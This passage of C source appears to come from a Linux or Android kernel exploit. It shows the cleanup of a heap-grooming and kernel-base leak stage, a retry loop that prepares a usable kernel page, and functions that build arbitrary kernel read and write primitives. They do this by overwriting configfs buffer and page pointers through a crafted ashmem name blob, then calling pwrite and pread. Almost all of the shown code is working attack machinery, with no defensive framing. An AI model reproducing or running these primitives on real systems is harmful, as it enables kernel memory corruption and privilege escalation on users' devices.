  for (size_t i = 0; i < deferred_reap_count; i++) {
    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
            i + 1, deferred_reap_count, deferred_reap_children[i]);
  }
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
          deferred_reap_count);
#endif
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
  log_mm_slabinfo("after-exact-drain-reclaim");
#else
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends, payload_mode);
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
          payload_mode, base);
#endif
  kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
          payload_mode);

  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
          prepare_ctx.mm_cnt);
#endif
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
        i + 1 == prepare_ctx.mm_cnt) {
      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
              i + 1, prepare_ctx.mm_cnt);
    }
#endif
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
          base);
#endif

  return base;
#endif
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    size_t started_ns = gettime_ns();
    uintptr_t base = prepare_kernel_page(payload_mode);
    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
            "base=%016zx\n",
            payload_mode, attempt, max_attempts, elapsed_ms, base);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  const uintptr_t write_align = 0x01000000ULL;
  const uint32_t max_write_window = 0x02000000U;
  if (!data || !len || len > SSIZE_MAX) {
    errno = EINVAL;
    return -1;
  }
  if (target > UINTPTR_MAX - (len - 1)) {
    errno = ERANGE;
    return -1;
  }
  uintptr_t base = target & ~(write_align - 1);
  off_t pos = (off_t)(target - base);
  if (len > UINTPTR_MAX - (uintptr_t)pos) {
    errno = ERANGE;
    return -1;
  }
  uintptr_t end = (uintptr_t)pos + len;
  uint32_t buffer_size = 0;

  if (end > max_write_window ||
      !((base >> 24) & 0xff) || !((base >> 32) & 0xff) ||
      !((base >> 40) & 0xff) || !((base >> 48) & 0xff) ||
      !((base >> 56) & 0xff)) {
    errno = ERANGE;
    return -1;
  }
  for (uintptr_t candidate_size = end;
       candidate_size <= max_write_window && candidate_size - end < 0x200;
       candidate_size++) {
    int usable = 1;
    for (size_t i = 0; i < 3; i++) {
      if (!((candidate_size >> (i * 8)) & 0xff)) {
        usable = 0;
        break;
      }
    }
    if (usable) {
      buffer_size = (uint32_t)candidate_size;
      break;
    }
  }
  if (!buffer_size) {
    errno = ERANGE;
    return -1;
  }
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, pos);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  uintptr_t page = 0;
  off_t pos = 0;

  if (!data || !len || len > SSIZE_MAX) {
    errno = EINVAL;
    return -1;
  }
  if (target > UINTPTR_MAX - (len - 1) || len > UINT64_MAX - 0x10000 ||
      len + 0x10000 >= ASHMEM_PREFIX_COUNT) {
    errno = ERANGE;
    return -1;
  }

  memset(blob, 0, sizeof(blob));
  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
  for (uint64_t window = len; window < len + 0x10000; ++window) {
    uintptr_t candidate_pos = ASHMEM_PREFIX_COUNT - window;
    if (target < candidate_pos) {
      continue;
    }
    uintptr_t candidate_page = target - candidate_pos;
    int usable = 1;

    for (size_t i = 0; i < sizeof(candidate_page); ++i) {
      if (!((candidate_page >> (i * 8)) & 0xff)) {
        usable = 0;
        break;
      }
    }
    if (usable) {
      page = candidate_page;
      pos = (off_t)candidate_pos;
      break;
    }
  }
  if (!page) {
    errno = ERANGE;
    return -1;
  }
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
